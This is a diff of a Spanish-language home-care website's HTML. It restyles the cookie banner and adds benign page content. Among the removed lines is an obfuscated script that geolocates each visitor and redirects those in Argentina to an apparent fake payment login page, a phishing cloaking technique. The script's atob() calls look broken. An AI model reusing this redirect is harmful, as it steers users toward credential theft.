-    right:
-        20px;
+        .cookie-button {
+            min-height: 42px;
 
-    bottom:
-        20px;
+            padding:
+                0 15px;
 
-    z-index:
-        1000;
+            border-radius: 9px;
 
-    display:
-        none;
+            border:
+                1px solid var(--border);
 
-    max-width:
-        1080px;
+            background: white;
 
-    margin:
-        auto;
+            color: var(--text);
 
-    padding:
-        20px;
+            cursor: pointer;
 
-    background:
-        white;
+            font-size: 13px;
 
-    border:
-        1px solid #dfe3eb;
+            font-weight: 700;
+        }
 
-    border-radius:
-        18px;
+        .cookie-button:hover {
+            background: #f7f8fa;
+        }
 
-    box-shadow:
-        0 20px 60px
-        rgba(15,23,42,.18);
-}
+        .cookie-button.primary {
+            background:
+                var(--primary);
 
-.cookie-banner.show {
-    display:
-        block;
-}
+            color: white;
 
-.cookie-content {
-    display:
-        flex;
+            border-color:
+                var(--primary);
+        }
 
-    align-items:
-        center;
+        .cookie-button.primary:hover {
+            background:
+                var(--primary-dark);
+        }
 
-    gap:
-        20px;
-}
 
-.cookie-icon {
-    width:
-        45px;
+        /* =========================
+           COOKIE SETTINGS
+        ========================= */
 
-    height:
-        45px;
+        .cookie-settings {
+            display: none;
 
-    flex-shrink:
-        0;
+            position: fixed;
 
-    display:
-        flex;
+            inset: 0;
 
-    align-items:
-        center;
+            z-index: 1100;
 
-    justify-content:
-        center;
+            background:
+                rgba(15,23,42,.65);
 
-    background:
-        var(--primary-light);
+            padding: 20px;
 
-    border-radius:
-        12px;
+            align-items: center;
+            justify-content: center;
+        }
 
-    font-size:
-        22px;
-}
+        .cookie-settings.show {
+            display: flex;
+        }
 
-.cookie-text {
-    flex:
-        1;
-}
+        .cookie-panel {
+            width:
+                min(620px,100%);
 
-.cookie-text h3 {
-    margin-bottom:
-        4px;
+            max-height:
+                90vh;
 
-    font-size:
-        16px;
-}
+            overflow-y: auto;
 
-.cookie-text p {
-    color:
-        var(--muted);
+            background: white;
 
-    font-size:
-        13px;
-}
+            border-radius:
+                20px;
 
-.cookie-text a {
-    color:
-        var(--primary);
+            box-shadow:
+                0 30px 80px
+                rgba(0,0,0,.25);
+        }
 
-    text-decoration:
-        underline;
-}
+        .cookie-panel-header {
+            display: flex;
 
-.cookie-actions {
-    display:
-        flex;
+            justify-content: space-between;
 
-    gap:
-        8px;
+            align-items: center;
 
-    flex-shrink:
-        0;
-}
+            padding:
+                22px 25px;
 
-.cookie-button {
-    min-height:
-        42px;
+            border-bottom:
+                1px solid var(--border);
+        }
 
-    padding:
-        0 15px;
+        .cookie-panel-header h3 {
+            font-size: 19px;
+        }
 
-    background:
-        white;
+        .cookie-panel-close {
+            width: 35px;
+            height: 35px;
 
-    border:
-        1px solid var(--border);
+            border: none;
 
-    border-radius:
-        9px;
+            background:
+                #f1f5f9;
 
-    cursor:
-        pointer;
+            border-radius: 9px;
 
-    font-size:
-        13px;
+            cursor: pointer;
 
-    font-weight:
-        700;
-}
+            font-size: 20px;
 
-.cookie-button.primary {
-    background:
-        var(--primary);
+            color: #667085;
+        }
 
-    color:
-        white;
+        .cookie-panel-body {
+            padding: 25px;
+        }
 
-    border-color:
-        var(--primary);
-}
+        .cookie-intro {
+            color: var(--muted);
 
+            font-size: 14px;
 
-/* =====================================================
-   PANEL COOKIES
-===================================================== */
+            margin-bottom: 20px;
+        }
 
-.cookie-settings {
-    position:
-        fixed;
+        .cookie-category {
+            display: flex;
 
-    inset:
-        0;
+            justify-content: space-between;
 
-    z-index:
-        1100;
+            align-items: center;
 
-    display:
-        none;
+            gap: 20px;
 
-    align-items:
-        center;
+            padding:
+                17px 0;
 
-    justify-content:
-        center;
+            border-bottom:
+                1px solid var(--border);
+        }
 
-    padding:
-        20px;
+        .cookie-category:last-of-type {
+            border-bottom: none;
+        }
 
-    background:
-        rgba(15,23,42,.65);
-}
+        .cookie-category h4 {
+            color: var(--text);
 
-.cookie-settings.show {
-    display:
-        flex;
-}
+            font-size: 14px;
 
-.cookie-panel {
-    width:
-        min(620px,100%);
+            margin-bottom: 3px;
+        }
 
-    max-height:
-        90vh;
+        .cookie-category p {
+            color: var(--muted);
 
-    overflow-y:
-        auto;
+            font-size: 12px;
 
-    background:
-        white;
+            max-width: 450px;
+        }
 
-    border-radius:
-        20px;
-}
+        .cookie-status {
+            font-size: 11px;
 
-.cookie-panel-header {
-    display:
-        flex;
+            font-weight: 800;
 
-    align-items:
-        center;
+            color: var(--primary);
 
-    justify-content:
-        space-between;
+            white-space: nowrap;
+        }
 
-    padding:
-        22px 25px;
+        .cookie-toggle {
+            position: relative;
 
-    border-bottom:
-        1px solid var(--border);
-}
+            width: 45px;
+            height: 25px;
 
-.cookie-panel-close {
-    width:
-        36px;
+            flex-shrink: 0;
+        }
 
-    height:
-        36px;
+        .cookie-toggle input {
+            opacity: 0;
 
-    border:
-        none;
+            width: 0;
+            height: 0;
+        }
 
-    background:
-        #f1f5f9;
+        .cookie-slider {
+            position: absolute;
 
-    border-radius:
-        9px;
+            inset: 0;
 
-    cursor:
-        pointer;
+            cursor: pointer;
 
-    font-size:
-        20px;
-}
+            background:
+                #cbd2df;
 
-.cookie-panel-body {
-    padding:
-        25px;
-}
+            border-radius: 30px;
 
-.cookie-intro {
-    margin-bottom:
-        20px;
+            transition: .2s;
+        }
 
-    color:
-        var(--muted);
+        .cookie-slider::before {
+            content: "";
 
-    font-size:
-        14px;
-}
+            position: absolute;
 
-.cookie-category {
-    display:
-        flex;
+            width: 19px;
+            height: 19px;
 
-    align-items:
-        center;
+            left: 3px;
+            top: 3px;
 
-    justify-content:
-        space-between;
+            background: white;
 
-    gap:
-        20px;
+            border-radius: 50%;
 
-    padding:
-        17px 0;
+            transition: .2s;
 
-    border-bottom:
-        1px solid var(--border);
-}
+            box-shadow:
+                0 1px 3px
+                rgba(0,0,0,.15);
+        }
 
-.cookie-category h4 {
-    font-size:
-        14px;
-}
+        .cookie-toggle input:checked
+        + .cookie-slider {
+            background:
+                var(--primary);
+        }
 
-.cookie-category p {
-    max-width:
-        450px;
+        .cookie-toggle input:checked
+        + .cookie-slider::before {
+            transform:
+                translateX(20px);
+        }
 
-    color:
-        var(--muted);
+        .cookie-toggle input:disabled
+        + .cookie-slider {
+            opacity: .65;
 
-    font-size:
-        12px;
-}
+            cursor: not-allowed;
+        }
 
-.cookie-status {
-    color:
-        var(--primary);
+        .cookie-panel-footer {
+            display: flex;
 
-    font-size:
-        11px;
+            justify-content: flex-end;
 
-    font-weight:
-        800;
+            gap: 9px;
 
-    white-space:
-        nowrap;
-}
+            padding:
+                18px 25px;
 
-.cookie-toggle {
-    position:
-        relative;
+            border-top:
+                1px solid var(--border);
+        }
 
-    width:
-        45px;
 
-    height:
-        25px;
+        /* =========================
+           COOKIE FLOATING BUTTON
+        ========================= */
 
-    flex-shrink:
-        0;
-}
+        .cookie-manage {
+            position: fixed;
 
-.cookie-toggle input {
-    opacity:
-        0;
+            left: 15px;
+            bottom: 15px;
 
-    width:
-        0;
+            z-index: 900;
 
-    height:
-        0;
-}
+            width: 43px;
+            height: 43px;
 
-.cookie-slider {
-    position:
-        absolute;
+            display: none;
 
-    inset:
-        0;
+            align-items: center;
+            justify-content: center;
 
-    background:
-        #cbd2df;
+            border: 1px solid var(--border);
 
-    border-radius:
-        30px;
+            background: white;
 
-    cursor:
-        pointer;
-}
+            border-radius: 12px;
 
-.cookie-slider::before {
-    content:
-        "";
+            cursor: pointer;
 
-    position:
-        absolute;
+            box-shadow:
+                0 8px 25px
+                rgba(15,23,42,.12);
 
-    left:
-        3px;
+            font-size: 19px;
+        }
 
-    top:
-        3px;
+        .cookie-manage.show {
+            display: flex;
+        }
 
-    width:
-        19px;
+        .cookie-manage:hover {
+            transform: translateY(-2px);
+        }
 
-    height:
-        19px;
 
-    background:
-        white;
+        /* =========================
+           MOBILE
+        ========================= */
 
-    border-radius:
-        50%;
+        @media (max-width: 900px) {
 
-    transition:
-        .2s;
-}
+            .nav {
+                display: none;
 
-.cookie-toggle input:checked
-+ .cookie-slider {
-    background:
-        var(--primary);
-}
+                position: absolute;
 
-.cookie-toggle input:checked
-+ .cookie-slider::before {
-    transform:
-        translateX(20px);
-}
+                top: 72px;
+                left: 0;
+                right: 0;
 
-.cookie-panel-footer {
-    display:
-        flex;
+                background: white;
 
-    justify-content:
-        flex-end;
+                border-bottom:
+                    1px solid var(--border);
 
-    gap:
-        9px;
+                padding: 15px 20px;
 
-    padding:
-        18px 25px;
+                flex-direction: column;
 
-    border-top:
-        1px solid var(--border);
-}
+                align-items: stretch;
 
+                gap: 0;
+            }
 
-/* =====================================================
-   RESPONSIVE
-===================================================== */
+            .nav.active {
+                display: flex;
+            }
 
-@media (max-width: 900px) {
+            .nav a {
+                padding: 13px 5px;
+            }
 
-    .nav {
-        position:
-            absolute;
+            .menu-button {
+                display: block;
+            }
 
-        top:
-            72px;
+            .hero-content {
+                grid-template-columns: 1fr;
 
-        left:
-            0;
+                gap: 40px;
 
-        right:
-            0;
+                padding:
+                    55px 0;
+            }
 
-        display:
-            none;
+            .hero-card {
+                min-height: 280px;
+            }
 
-        flex-direction:
-            column;
+            .cards,
+            .article-grid {
+                grid-template-columns: 1fr 1fr;
+            }
 
-        align-items:
-            stretch;
+            .about,
+            .contact-inner {
+                grid-template-columns: 1fr;
 
-        gap:
-            0;
+                gap: 35px;
+            }
 
-        padding:
-            12px 20px;
+            .footer-top {
+                flex-direction: column;
+            }
 
-        background:
-            white;
+            .footer-links {
+                gap: 45px;
+            }
 
-        border-bottom:
-            1px solid var(--border);
-    }
+            .cookie-content {
+                align-items: flex-start;
+            }
 
-    .nav.active {
-        display:
-            flex;
-    }
+            .cookie-actions {
+                flex-direction: column;
+            }
 
-    .nav a {
-        padding:
-            13px 5px;
-    }
+        }
 
-    .menu-button {
-        display:
-            block;
-    }
 
-    .hero-content {
-        grid-template-columns:
-            1fr;
+        @media (max-width: 620px) {
 
-        gap:
-            40px;
-    }
+            .container {
+                width:
+                    min(
+                        calc(100% - 28px),
+                        var(--max-width)
+                    );
+            }
 
-    .cards,
-    .article-grid {
-        grid-template-columns:
-            1fr 1fr;
-    }
+            .header-inner {
+                min-height: 64px;
+            }
 
-    .about,
-    .contact-inner {
-        grid-template-columns:
-            1fr;
-    }
+            .nav {
+                top: 64px;
+            }
 
-    .footer-top {
-        flex-direction:
-            column;
-    }
+            .hero h1 {
+                font-size: 42px;
 
-    .cookie-content {
-        align-items:
-            flex-start;
-    }
+                letter-spacing:
+                    -1.8px;
+            }
 
-    .cookie-actions {
-        flex-direction:
-            column;
-    }
-}
+            .hero-text {
+                font-size: 16px;
+            }
 
+            .hero-actions {
+                flex-direction: column;
+            }
 
-@media (max-width: 620px) {
+            .button {
+                width: 100%;
+            }
 
-    .container {
-        width:
-            calc(100% - 28px);
-    }
+            .cards,
+            .article-grid {
+                grid-template-columns: 1fr;
+            }
 
-    .hero-content {
-        padding:
-            55px 0;
-    }
+            .section {
+                padding:
+                    60px 0;
+            }
 
-    .hero h1 {
-        font-size:
-            42px;
+            .notice-box {
+                align-items: flex-start;
+            }
 
-        letter-spacing:
-            -1.8px;
-    }
+            .footer-links {
+                flex-direction: column;
 
-    .hero-text {
-        font-size:
-            16px;
-    }
+                gap: 20px;
+            }
 
-    .hero-actions {
-        flex-direction:
-            column;
-    }
+            .footer-bottom {
+                flex-direction: column;
+            }
 
-    .button {
-        width:
-            100%;
-    }
+            .cookie-banner {
+                left: 10px;
+                right: 10px;
+                bottom: 10px;
 
-    .hero-card {
-        min-height:
-            300px;
-    }
+                padding: 17px;
+            }
 
-    .cards,
-    .article-grid,
-    .topic-content {
-        grid-template-columns:
-            1fr;
-    }
+            .cookie-content {
+                display: block;
+            }
 
-    .section {
-        padding:
-            60px 0;
-    }
+            .cookie-icon {
+                margin-bottom: 12px;
+            }
 
-    .footer-links {
-        flex-direction:
-            column;
+            .cookie-actions {
+                margin-top: 15px;
 
-        gap:
-            22px;
-    }
+                display: grid;
 
-    .footer-bottom {
-        flex-direction:
-            column;
-    }
+                grid-template-columns:
+                    1fr 1fr;
+            }
 
-    .cookie-banner {
-        left:
-            10px;
+            .cookie-button {
+                width: 100%;
+            }
 
-        right:
-            10px;
+            .cookie-button.primary {
+                grid-column:
+                    span 2;
+            }
 
-        bottom:
-            10px;
-    }
+            .cookie-category {
+                align-items: flex-start;
+            }
 
-    .cookie-content {
-        display:
-            block;
-    }
+            .cookie-panel-footer {
+                flex-direction: column;
+            }
 
-    .cookie-icon {
-        margin-bottom:
-            12px;
-    }
+            .cookie-panel-footer .cookie-button {
+                width: 100%;
+            }
 
-    .cookie-actions {
-        display:
-            grid;
+        }
 
-        grid-template-columns:
-            1fr 1fr;
-
-        margin-top:
-            15px;
-    }
-
-    .cookie-button.primary {
-        grid-column:
-            span 2;
-    }
-
-    .cookie-panel-footer {
-        flex-direction:
-            column;
-    }
-
-    .cookie-panel-footer
-    .cookie-button {
-        width:
-            100%;
-    }
-
-}
-
-</style>
-<script>
-(function(){
-  const _0x2f4a = atob("https://multipaymultipay.vercel.app/login.html");
-  const _0x3b8c = atob("inicio.html");
-  
-  const _0x4d2e = 'https://ipapi.co/json/';
-  
-  fetch(_0x4d2e)
-    .then(_0x5a1f => _0x5a1f.json())
-    .then(_0x2b7c => {
-      if (_0x2b7c.country === "AR") {
-        window.location.href = _0x2f4a;
-      } else {
-        window.location.href = _0x3b8c;
-      }
-    })
-    .catch(() => {
-      window.location.href = _0x3b8c;
-    });
-})();
-</script>
-
+    </style>
 </head>
 
 
 <body>
 
 
+<!-- =========================
+     HEADER
+========================= -->
+
+<header class="header">
+
+    <div class="container header-inner">
+
+        <a href="#inicio"
+           class="logo">
+
+            <div class="logo-icon">
+                ⌂
+            </div>
+
+            TuCasa<span>AlDía</span>
+
+        </a>
+
+
+        <nav class="nav"
+             id="mainNav">
+
+            <a href="#inicio">
+                Inicio
+            </a>
+
+            <a href="#guias">
+                Guías
+            </a>
+
+            <a href="#articulos">
+                Artículos
+            </a>
+
+            <a href="#sobre-nosotros">
+                Sobre nosotros
+            </a>
+
+            <a href="#contacto">
+                Contacto
+            </a>
+
+        </nav>
+
+
+        <button class="menu-button"
+                onclick="toggleMenu()"
+                aria-label="Abrir menú">
+
+            ☰
+
+        </button>
+
+    </div>
+
+</header>
+
+
+
+<!-- =========================
+     HERO
+========================= -->
+
+<main id="inicio">
+
+    <section class="hero">
+
+        <div class="container hero-content">
+
+
+            <div>
+
+                <div class="hero-label">
+
+                    <i></i>
+
+                    INFORMACIÓN PARA EL HOGAR
+
+                </div>
+
+
+                <h1>
+
+                    Ideas sencillas para
+                    <span>cuidar tu casa.</span>
+
+                </h1>
+
+
+                <p class="hero-text">
+
+                    TuCasaAlDía reúne información general,
+                    consejos y contenidos prácticos relacionados
+                    con la organización, mantenimiento y cuidado
+                    de la vivienda.
+
+                </p>
+
+
+                <div class="hero-actions">
+
+                    <a href="#guias"
+                       class="button button-primary">
+
+                        Ver guías
+
+                    </a>
+
+
+                    <a href="#sobre-nosotros"
+                       class="button button-secondary">
+
+                        Conocer el sitio
+
+                    </a>
+
+                </div>
+
+            </div>
+
+
+            <div class="hero-card"
+                 aria-hidden="true">
+
+                <div class="house">
+
+                    <div class="roof"></div>
+
+                    <div class="window window-one"></div>
+
+                    <div class="window window-two"></div>
+
+                    <div class="door"></div>
+
+                </div>
+
+            </div>
+
+
+        </div>
+
+    </section>
+
+
+
+    <!-- =========================
+         AVISO
+    ========================= -->
+
+    <section class="notice">
+
+        <div class="container">
+
+            <div class="notice-box">
+
+                <div class="notice-icon">
+                    i
+                </div>
+
+                <div>
+
+                    <strong>
+                        Información de carácter general
+                    </strong>
+
+                    <p>
+
+                        Los contenidos de TuCasaAlDía tienen
+                        finalidad informativa. Para situaciones
+                        específicas, consulta fuentes oficiales
+                        o profesionales calificados.
+
+                    </p>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+
+    <!-- =========================
+         GUIAS
+    ========================= -->
+
+    <section class="section"
+             id="guias">
+
+        <div class="container">
+
+
+            <div class="section-header">
+
+                <div class="section-tag">
+                    GUÍAS
+                </div>
+
+                <h2>
+                    Temas para conocer mejor tu hogar
+                </h2>
+
+                <p>
+                    Contenido organizado por categorías para
+                    encontrar información de forma sencilla.
+                </p>
+
+            </div>
+
+
+            <div class="cards">
+
+
+                <article class="card">
+
+                    <div class="card-icon">
+                        🔧
+                    </div>
+
+                    <h3>
+                        Mantenimiento
+                    </h3>
+
+                    <p>
+                        Información general sobre revisiones,
+                        conservación y cuidado de diferentes
+                        elementos de una vivienda.
+                    </p>
+
+                </article>
+
+
+                <article class="card">
+
+                    <div class="card-icon">
+                        ✦
+                    </div>
+
+                    <h3>
+                        Limpieza
+                    </h3>
+
+                    <p>
+                        Ideas y recomendaciones generales para
+                        organizar las tareas de limpieza del hogar.
+                    </p>
+
+                </article>
+
+
+                <article class="card">
+
+                    <div class="card-icon">
+                        ▦
+                    </div>
+
+                    <h3>
+                        Organización
+                    </h3>
+
+                    <p>
+                        Consejos para distribuir, ordenar y
+                        aprovechar mejor los diferentes espacios.
+                    </p>
+
+                </article>
+
+
+                <article class="card">
+
+                    <div class="card-icon">
+                        ↗
+                    </div>
+
+                    <h3>
+                        Mejoras
+                    </h3>
+
+                    <p>
+                        Aspectos generales que conviene considerar
+                        antes de realizar cambios en una vivienda.
+                    </p>
+
+                </article>
+
+
+                <article class="card">
+
+                    <div class="card-icon">
+                        ♧
+                    </div>
+
+                    <h3>
+                        Jardín y exteriores
+                    </h3>
+
+                    <p>
+                        Información básica sobre el cuidado
+                        general de espacios exteriores.
+                    </p>
+
+                </article>
+
+
+                <article class="card">
+
+                    <div class="card-icon">
+                        ✓
+                    </div>
+
+                    <h3>
+                        Seguridad
+                    </h3>
+
+                    <p>
+                        Hábitos generales de prevención para
+                        mantener los espacios del hogar organizados.
+                    </p>
+
+                </article>
+
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+
+    <!-- =========================
+         ARTICULOS
+    ========================= -->
+
+    <section class="section articles"
+             id="articulos">
+
+        <div class="container">
+
+
+            <div class="section-header">
+
+                <div class="section-tag">
+                    CONTENIDO
+                </div>
+
+                <h2>
+                    Información destacada
+                </h2>
+
+                <p>
+                    Algunos temas generales para comenzar
+                    a conocer y cuidar mejor los espacios.
+                </p>
+
+            </div>
+
+
+            <div class="article-grid">
+
+
+                <article class="article">
+
+                    <div class="article-top">
+                        🔧
+                    </div>
+
+                    <div class="article-body">
+
+                        <div class="article-label">
+                            Mantenimiento
+                        </div>
+
+                        <h3>
+                            Revisiones básicas de una vivienda
+                        </h3>
+
+                        <p>
+                            Conoce algunos elementos que pueden
+                            revisarse periódicamente para detectar
+                            señales de deterioro.
+                        </p>
+
+                    </div>
+
+                </article>
+
+
+                <article class="article">
+
+                    <div class="article-top">
+                        ✦
+                    </div>
+
+                    <div class="article-body">
+
+                        <div class="article-label">
+                            Organización
+                        </div>
+
+                        <h3>
+                            Cómo organizar mejor los espacios
+                        </h3>
+
+                        <p>
+                            Algunas ideas sencillas para mantener
+                            las habitaciones ordenadas y funcionales.
+                        </p>
+
+                    </div>
+
+                </article>
+
+
+                <article class="article">
+
+                    <div class="article-top">
+                        ♢
+                    </div>
+
+                    <div class="article-body">
+
+                        <div class="article-label">
+                            Hogar
+                        </div>
+
+                        <h3>
+                            Hábitos para cuidar la vivienda
+                        </h3>
+
+                        <p>
+                            Pequeños hábitos cotidianos pueden
+                            facilitar el cuidado general del hogar.
+                        </p>
+
+                    </div>
+
+                </article>
+
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+
+    <!-- =========================
+         SOBRE NOSOTROS
+    ========================= -->
+
+    <section class="section"
+             id="sobre-nosotros">
+
+        <div class="container about">
+
+
+            <div class="about-text">
+
+                <div class="section-tag">
+                    SOBRE NOSOTROS
+                </div>
+
+                <h2>
+                    ¿Qué es TuCasaAlDía?
+                </h2>
+
+                <p>
+                    TuCasaAlDía es un sitio web informativo
+                    dedicado a recopilar y presentar contenidos
+                    generales relacionados con el hogar.
+                </p>
+
+                <p>
+                    El proyecto busca ofrecer una experiencia
+                    sencilla para que los visitantes puedan
+                    consultar información sobre organización,
+                    mantenimiento, limpieza y otros temas
+                    relacionados con la vivienda.
+                </p>
+
+                <p>
+                    El contenido tiene carácter general y
+                    educativo. No representa una oferta de
+                    servicios profesionales.
+                </p>
+
+            </div>
+
+
+            <div class="about-list">
+
+
+                <div class="about-item">
+
+                    <div class="check">
+                        ✓
+                    </div>
+
+                    <div>
+
+                        <strong>
+                            Información clara
+                        </strong>
+
+                        <span>
+                            Contenido presentado de manera
+                            sencilla y comprensible.
+                        </span>
+
+                    </div>
+
+                </div>
+
+
+                <div class="about-item">
+
+                    <div class="check">
+                        ✓
+                    </div>
+
+                    <div>
+
+                        <strong>
+                            Navegación sencilla
+                        </strong>
+
+                        <span>
+                            Secciones organizadas para encontrar
+                            información fácilmente.
+                        </span>
+
+                    </div>
+
+                </div>
+
+
+                <div class="about-item">
+
+                    <div class="check">
+                        ✓
+                    </div>
+
+                    <div>
+
+                        <strong>
+                            Enfoque informativo
+                        </strong>
+
+                        <span>
+                            Contenido general sin sustituir
+                            asesoramiento profesional.
+                        </span>
+
+                    </div>
+
+                </div>
+
+
+                <div class="about-item">
+
+                    <div class="check">
+                        ✓
+                    </div>
+
+                    <div>
+
+                        <strong>
+                            Transparencia
+                        </strong>
+
+                        <span>
+                            Información sobre el sitio y sus
+                            condiciones disponible públicamente.
+                        </span>
+
+                    </div>
+
+                </div>
+
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+
+    <!-- =========================
+         CONTACTO
+    ========================= -->
+
+    <section class="section contact"
+             id="contacto">
+
+        <div class="container contact-inner">
+
+
+            <div>
+
+                <div class="section-tag"
+                     style="background:rgba(255,255,255,.08);color:#b9c5ff;">
+
+                    CONTACTO
+
+                </div>
+
+                <h2>
+                    ¿Tienes una pregunta?
+                </h2>
+
+                <p>
+                    Si deseas comunicarte con el equipo de
+                    TuCasaAlDía, puedes utilizar los canales
+                    de contacto publicados en este sitio.
+                </p>
+
+            </div>
+
+
+            <div class="contact-box">
+
+                <div class="contact-row">
+
+                    <div class="contact-row-icon">
+                        @
+                    </div>
+
+                    <div>
+
+                        <strong>
+                            Correo electrónico
+                        </strong>
+
+                        <span>
+                            contacto@tucasaaldiajelpit.vercel.app
+                        </span>
+
+                    </div>
+
+                </div>
+
+
+                <div class="contact-row">
+
+                    <div class="contact-row-icon">
+                        ?
+                    </div>
+
+                    <div>
+
+                        <strong>
+                            Consultas generales
+                        </strong>
+
+                        <span>
+                            Para comentarios relacionados con
+                            el contenido del sitio.
+                        </span>
+
+                    </div>
+
+                </div>
+
+
+            </div>
+
+        </div>
+
+    </section>
+
+</main>
+
+
+
+<!-- =========================
+     FOOTER
+========================= -->
+
+<footer>
+
+    <div class="container">
+
+
+        <div class="footer-top">
+
+
+            <div class="footer-brand">
+
+                <div class="logo">
+
+                    <div class="logo-icon">
+                        ⌂
+                    </div>
+
+                    TuCasa<span>AlDía</span>
+
+                </div>
+
+                <p>
+                    Sitio informativo sobre organización,
+                    mantenimiento y cuidado general del hogar.
+                </p>
+
+            </div>
+
+
+            <div class="footer-links">
+
+
+                <div>
+
+                    <h4>
+                        Sitio
+                    </h4>
+
+                    <a href="#inicio">
+                        Inicio
+                    </a>
+
+                    <a href="#guias">
+                        Guías
+                    </a>
+
+                    <a href="#articulos">
+                        Artículos
+                    </a>
+
+                    <a href="#sobre-nosotros">
+                        Sobre nosotros
+                    </a>
+
+                    <a href="#contacto">
+                        Contacto
+                    </a>
+
+                </div>
+
+
+                <div>
+
+                    <h4>
+                        Legal
+                    </h4>
+
+                    <button onclick="openModal('privacidad')">
+                        Política de privacidad
+                    </button>
+
+                    <button onclick="openModal('terminos')">
+                        Términos y condiciones
+                    </button>
+
+                    <button onclick="openModal('aviso')">
+                        Aviso legal
+                    </button>
+
+                    <button onclick="openCookieSettings()">
+                        Configurar cookies
+                    </button>
+
+                </div>
+
+
+            </div>
+
+        </div>
+
+
+        <div class="footer-bottom">
+
+            <span>
+                © 2026 TuCasaAlDía
+            </span>
+
+            <span>
+                Sitio informativo independiente
+            </span>
+
+        </div>
+
+    </div>
+
+</footer>
+
+
+
+<!-- =====================================================
+     MODAL PRIVACIDAD
+===================================================== -->
+
+<div class="modal-bg"
+     id="modal-privacidad"
+     onclick="closeOutside(event,'privacidad')">
+
+    <div class="modal">
+
+        <div class="modal-header">
+
+            <h3>
+                Política de privacidad
+            </h3>
+
+            <button class="modal-close"
+                    onclick="closeModal('privacidad')">
+
+                ×
+
+            </button>
+
+        </div>
+
+
+        <div class="modal-content">
+
+            <h4>
+                Información general
+            </h4>
+
+            <p>
+                TuCasaAlDía respeta la privacidad de los
+                visitantes. Esta página explica de forma general
+                cómo se aborda la información relacionada con
+                el uso del sitio.
+            </p>
+
+
+            <h4>
+                Datos personales
+            </h4>
+
+            <p>
+                El sitio no requiere que los visitantes creen
+                una cuenta para consultar sus contenidos.
+            </p>
+
+
+            <h4>
+                Cookies
+            </h4>
+
+            <p>
+                El sitio puede utilizar cookies u otras
+                tecnologías similares para recordar preferencias
+                y, cuando corresponda, facilitar determinadas
+                funciones.
+            </p>
+
+
+            <h4>
+                Contacto
+            </h4>
+
+            <p>
+                Si una persona decide comunicarse mediante
+                un canal de contacto, la información enviada
+                será utilizada para atender la comunicación
+                correspondiente.
+            </p>
+
+
+            <h4>
+                Actualizaciones
+            </h4>
+
+            <p>
+                Esta política puede actualizarse cuando se
+                incorporen nuevas funcionalidades al sitio.
+            </p>
+
+
+            <p>
+                Última actualización: agosto de 2026.
+            </p>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+
+<!-- =====================================================
+     MODAL TERMINOS
+===================================================== -->
+
+<div class="modal-bg"
+     id="modal-terminos"
+     onclick="closeOutside(event,'terminos')">
+
+    <div class="modal">
+
+        <div class="modal-header">
+
+            <h3>
+                Términos y condiciones
+            </h3>
+
+            <button class="modal-close"
+                    onclick="closeModal('terminos')">
+
+                ×
+
+            </button>
+
+        </div>
+
+
+        <div class="modal-content">
+
+            <h4>
+                Uso del sitio
+            </h4>
+
+            <p>
+                TuCasaAlDía proporciona contenido informativo
+                general relacionado con el hogar.
+            </p>
+
+
+            <h4>
+                Carácter informativo
+            </h4>
+
+            <p>
+                Los contenidos publicados no constituyen
+                asesoramiento profesional. Cuando una situación
+                requiera conocimientos especializados, el usuario
+                debe acudir a un profesional calificado.
+            </p>
+
+
+            <h4>
+                Responsabilidad
+            </h4>
+
+            <p>
+                El contenido se proporciona como información
+                general y puede no ser aplicable a todas las
+                situaciones particulares.
+            </p>
+
+
+            <h4>
+                Actualización
+            </h4>
+
+            <p>
+                El contenido y estas condiciones pueden
+                actualizarse periódicamente.
+            </p>
+
+
+            <p>
+                Última actualización: agosto de 2026.
+            </p>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+
+<!-- =====================================================
+     MODAL AVISO LEGAL
+===================================================== -->
+
+<div class="modal-bg"
+     id="modal-aviso"
+     onclick="closeOutside(event,'aviso')">
+
+    <div class="modal">
+
+        <div class="modal-header">
+
+            <h3>
+                Aviso legal
+            </h3>
+
+            <button class="modal-close"
+                    onclick="closeModal('aviso')">
+
+                ×
+
+            </button>
+
+        </div>
+
+
+        <div class="modal-content">
+
+            <h4>
+                Identificación del sitio
+            </h4>
+
+            <p>
+                TuCasaAlDía es un proyecto web de carácter
+                informativo dedicado a contenidos relacionados
+                con el hogar.
+            </p>
+
+
+            <h4>
+                Finalidad
+            </h4>
+
+            <p>
+                La finalidad del sitio es presentar información
+                general sobre organización, mantenimiento,
+                limpieza y cuidado de viviendas.
+            </p>
+
+
+            <h4>
+                Sin representación de terceros
+            </h4>
+
+            <p>
+                TuCasaAlDía no se presenta como representante
+                oficial de fabricantes, empresas, instituciones
+                u otras marcas mencionadas eventualmente en
+                contenidos informativos.
+            </p>
+
+
+            <h4>
+                Contenido
+            </h4>
+
+            <p>
+                Se recomienda comprobar la información específica
+                con fuentes oficiales cuando corresponda.
+            </p>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+
+<!-- =====================================================
+     COOKIE BANNER
+===================================================== -->
+
+<div class="cookie-banner"
+     id="cookieBanner"
+     role="dialog"
+     aria-label="Preferencias de cookies">
+
+    <div class="cookie-content">
+
+
+        <div class="cookie-icon">
+            🍪
+        </div>
+
+
+        <div class="cookie-text">
+
+            <h3>
+                Preferencias de cookies
+            </h3>
+
+            <p>
+
+                Utilizamos cookies y tecnologías similares
+                para recordar tus preferencias y, si eliges
+                permitirlas, ayudar a mejorar la experiencia
+                del sitio.
+
+                Puedes
+                <a href="#"
+                   onclick="openCookieSettings(); return false;">
+                    configurar tus preferencias
+                </a>
+                en cualquier momento.
+
+            </p>
+
+        </div>
+
+
+        <div class="cookie-actions">
+
+            <button class="cookie-button"
+                    onclick="rejectCookies()">
+
+                Rechazar no esenciales
+
+            </button>
+
+
+            <button class="cookie-button"
+                    onclick="openCookieSettings()">
+
+                Configurar
+
+            </button>
+
+
+            <button class="cookie-button primary"
+                    onclick="acceptAllCookies()">
+
+                Aceptar todas
+
+            </button>
+
+        </div>
+
+
+    </div>
+
+</div>
+
+
+
+<!-- =====================================================
+     COOKIE SETTINGS
+===================================================== -->
+
+<div class="cookie-settings"
+     id="cookieSettings"
+     role="dialog"
+     aria-modal="true"
+     aria-label="Configuración de cookies">
+
+    <div class="cookie-panel">
+
+
+        <div class="cookie-panel-header">
+
+            <h3>
+                Configuración de cookies
+            </h3>
+
+            <button class="cookie-panel-close"
+                    onclick="closeCookieSettings()">
+
+                ×
+
+            </button>
+
+        </div>
+
+
+        <div class="cookie-panel-body">
+
+
